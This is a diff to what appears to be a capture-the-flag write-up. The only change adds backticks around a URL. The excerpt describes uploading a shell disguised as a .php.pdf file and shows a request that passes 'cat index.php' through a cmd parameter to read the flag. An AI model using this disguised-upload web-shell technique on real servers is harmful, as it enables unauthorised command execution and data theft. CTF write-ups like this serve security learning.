@@ -34,7 +34,7 @@ you can upload a shell or just read the index.php file
 
 in my case:
 
-http://18.192.3.151/join-team/?data/test.php.pdf&cmd=cat index.php
+`http://18.192.3.151/join-team/?data/test.php.pdf&cmd=cat index.php`
 
 now we can read flag at page source :)
 
